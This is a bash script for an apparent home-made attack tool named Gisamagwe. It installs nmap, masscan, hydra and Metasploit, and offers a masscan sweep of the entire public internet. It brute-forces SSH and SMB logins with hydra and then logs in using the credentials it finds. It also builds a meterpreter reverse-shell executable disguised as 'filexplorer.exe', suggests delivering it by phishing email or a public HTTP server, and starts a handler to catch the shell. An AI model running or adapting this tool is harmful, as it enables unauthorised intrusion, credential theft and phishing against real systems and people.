#!/bin/bash
logs="logs.txt"
file="output.txt"
usernames="usernames.txt"
passwords="passwords.txt"
logs_nmap="nmp.txt"
ip=""

function welcome(){
    echo "======================================================================================"
    echo "🚀 Welcome to Gisamagwe Miseles Cyber attacks! 💥"
    echo "Run this toll as a root user and make sure you have all write/read permissions in the current directory"
    echo "You will be prompted to choose an attack after scanning vulnerabilities in this Network"
    echo "$(date), Gisamagwe Msillies Startted by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
    echo "$logs"
    attacks
}

# Installing necessary tools
function install(){
    echo "We are setting up for you, leave this to us 🛠️"
    sudo apt install nmap masscan msfconsole msfvenom ssh sshpass
    echo "done!"
    attacks
}

# Public dangerous scan
function public_scanner() {
    echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    echo "You chose violent scanning to public IPs.................."
    echo "This big number might take longer hours...................."
    read -p "Enter number of IPs to discover: " max
	
    # Check if the file exists
    if [ ! -f "$file" ]; then
        echo "Error: $file not found! 🚨"
        return 1  # Exit the function if file doesn't exist
    fi
	echo "$(date), User choosed dangerous attack on the internet by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
    # Start masscan in the background and capture the PID
    sudo masscan 0.0.0.0/0 -p80,443,445,22 --rate 100000 --exclude 255.255.255.255 | tee -a "$file" > /dev/null &
    masscan_pid=$!  # Capture the background process ID
	echo "$(date), Scan is complete all discovered Ip/Port keept in $file by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
    # Initialize line count to 0
    lines=0

    # Start the scan loop to monitor IPs
    while [ "$max" -gt "$lines" ]; do
        # Count non-empty lines in the file (IPs discovered so far)
        lines=$(grep -cve '^\s*$' "$file")  # Count non-empty lines

        # Output the number of currently discovered IPs
        echo "Currently scanned IPs: $lines"

        # If we have reached the max IPs to discover, stop scanning
        if [ "$max" -le "$lines" ]; then
            echo "Scans complete, exiting function... 🚨"
            # Kill the masscan process after reaching the max
            kill "$masscan_pid"
            break
        fi
    done
    cat "$file"
}

# Scanning starts here......
function scanner(){
    #current_date=$(date "+%Y-%m-%d %H:%M:%S")
    current_date=$(date "+%Y-%m-%d %H:%M:%S")
    read -p "Choose 1 for Windows, 2 for Linux attack: " framework
    read -p "Enter your private network to simulate attack: " ip
    case $framework in
        1)
            echo "Scan started at: $current_date" | tee -a "$logs_nmap"
            nmap -p- -sV -O "$ip" | tee -a "$logs_nmap"
            echo "Scan ended at $(date)" | tee -a "$logs_nmap"
            ;;
        2)
            echo "Scan started at: $current_date" | tee -a "$logs_nmap"
            nmap -p- -sV -O "$ip" | tee -a "$logs_nmap"
            echo "Scan ended at $(date)" | tee -a "$logs_nmap"
            ;;
        *)
            echo "Invalid option 🚨"
            ;;
    esac
    echo "NMAP Scanning 💥.................................../\....................................Completed"
    echo "Record the above IPs and ports for entry in next attack"
}

# SMB and SSH attack done here.
function bruteForce(){
    echo "💣 You are attempting a brute force attack 💥"
    
    # Username creation
    python randomNames.py
    echo "$(date), Random names were created by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
    # Initialize counter variable
    i=0
    max=500
    # Password generation
    touch passwords.txt
    while IFS= read -r username
    do
        password=$(echo "$username" | openssl dgst -sha256 | cut -d ' ' -f 2 | head -c 12)  
        echo "$password" >> "$passwords"
        ((i++))
        progress=$(( (i*100) / max))
        echo "$progress% Completed"
    done < "$usernames"
    echo "$(date), Passwords were created based on usernames by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
    
    # The engine is ready now
    echo "Gisamagwe is ready........... 🚀"
    read -p "Choose 1 for SSH, 2 for SMB attack: " choosen
    
    # Call scanner method to check for vulnerable IP/Port
    read -p "1 for Simulation attack in your private network/Virtual machine, 2 for Dangerous public attack: " choice3
    if [[ "$choice3" == "1" ]] ; then
		echo "$(date), Simulation attcak by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
        scanner
    elif [[ "$choice3" == "2" ]]; then
        echo "This is much more dangerous use it at your own risk 💀"
        echo "$(date), Deadly attack was choosen by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
        public_scanner
    else
        exit 1
    fi
    echo "===================="
    read -p "Enter Scanned IP to attack: " target
    read -p "Enter Open ports found: " port
    case $choosen in 
        1)
            hydra -l "$usernames" -P "$passwords" ssh://"$target" -t 4 | while read line; do 
                if echo "$line" | grep -iq "Login successful"; then
                    # debugingi found_pass=$(echo "$line" | awk '{print $NF}')
                    found_user=$(echo "$line" | awk '{print $3}')
                    found_pass=$(echo "$line" | awk '{print $6}')
                    echo "Username aand Password found for SSH: $found_user, $found_pass"
                    echo "$(date), Password found for SSH: $found_pass by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
                    sshBrute
                fi
            done
            ;;
        2)
            hydra -l "$names" -P "$passwords" smb://"$target:$port" -t 4 | while read line; do
                if echo "$line" | grep -iq "Login successful"; then
                    #Debugging  found_pass=$(echo "$line" | awk '{print $NF}')
                    found_user=$(echo "$line" | awk '{print $3}')
                    found_pass=$(echo "$line" | awk '{print $6}')
                    echo "User and Password found for SMB: $found_user, $found_pass"
                    echo "$(date), Password found for SMB: $found_pass by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
                    smbBrute
                fi
            done
            ;;
        *)
            echo "Invalid option 🚨"
            ;;
    esac
}

#SSh attack
function sshBrute(){
		 sshpass -p "$found_pass" ssh -o StrictHostKeyChecking=no "$found_user@$ip"
		 # Debugging sshpass -p Passw0rd! ssh -o StrictHostKeyChecking=no soc1@172.16.50.20
         echo "$(date), Attack SSH service on: $found_pass by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
}

function smbBrute(){
	smbclient -L "//$target" -U "$username%$found_pass"
	# Debbuging smbclient -L "//172.16.50.20" -U soc1%Passw0rd!
    echo "$(date), Attack SMB service on: $found_pass by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
}

# Metasploit missiles launched here
function metas(){
    read -p "1 for automatic attack 🚀, 2 for manual: " choice2
    case $choice2 in
        1)
            target=$(ifconfig | grep inet | awk '{print $2}' | head -n 1)
            echo "$(date), Automated attack by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            ;;
        2)
            read -p "Enter your IP to listen silently your rivals: " target
            read -p "Enter port to listen on (default 4444): " port
            echo "$(date), Manual attack listening with $target on $port by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            ;;
        *)
            echo "Invalid choice.........."
            echo "$(date), Metaplsoit attack failed by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            exit
            ;;
    esac
    port=4444
    if [[ -z "$target" || -z "$port" ]]; then
        echo "Error: IP address to listen are required"
        exit 1;
    else
        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$target" LPORT="$port" -f exe > filexplorer.exe
        echo "Payload created: fileexplorer.exe"
        log_attack "======================Windows payload generated for $target===================="
        read -p "Send this payload 1. through a phishing email or 2. Python server to distribute this Missile: " opt
        if [ "$opt" == "1" ]; then
            echo "Send an email now...................."
            echo "Starting the listener 🔊"
            echo "$(date), Payload created and distributed on email by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            listener
        elif [ "$opt" == "2" ]; then
            echo "Starting Python server, please share the below link with your opponent"
            python3 -m http.server 8000 --bind 0.0.0.0
            echo "$(date), Payload created and distributed using a pyhton server by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            echo "Launching the listener to get root access to your rivals..............."  
            listener
        fi
    fi
}

# Listen for the PAYLOAD here.
function listener(){
    msfdb reinit
    msfconsole -x "use exploit/multi/handler;
    set PAYLOAD windows/meterpreter/reverse_tcp;
    set LHOST $target;
    set LPORT $port;
    exploit"
}

function attacks(){
	readme="https://github.com/MUGWANEZAMANZI/checker/blob/main/README.md"
	wget "$readme"
	echo "Copy and paste the below link to access a readme file"
	
	#Logging
	echo "$(date), Downloaded readm file by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
	
	echo "https://github.com/MUGWANEZAMANZI/checker/blob/main/README.md"
    echo "🎯 Welcome to Gisamagwe attacking and vulnerability tool. Use it at your own risk 🎯"
    echo "We are offering you various attacks========>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    echo " You can use Cmd/Ctrl + c to quit"
    echo "Pre-requisites:"
    echo "Make sure you are using Linux and that these tools nmap, hydra, msfvenom, msfconsole, masscan, ssh, and smb services are running."
    read -p "Choose 1 to install tools, another number to continue: " tool
    if [ $tool -eq 1 ]; then
		unset tool
		install
		echo "$(date),Installed tools by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
	fi
    read -p "Choose 1 for Gisamagwe missile 🚀, 2 for Gisamagwe SSH Attack 💣, 3 for SMB Gisamagwe attack 🔓: " choice1
    case $choice1 in
        1)
            metas
            echo "$(date), Metasploit attack was choosen by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            ;;
        2)
            bruteForce
            echo "$(date), SSH Bruteforce attack was choosen by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            ;;
        3)
            bruteForce
            echo "$(date), SMB brutefirce attack was choosen by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            ;;
        *)
            echo "Invalid option, quitting 😞"  
            echo "$(date), Invalid attcak by $(whoami), with IP address $(ifconfig | grep inet | awk '{print $2}' | head -n 1)" >> "$logs"
            exit 0
            ;;
    esac
}

welcome

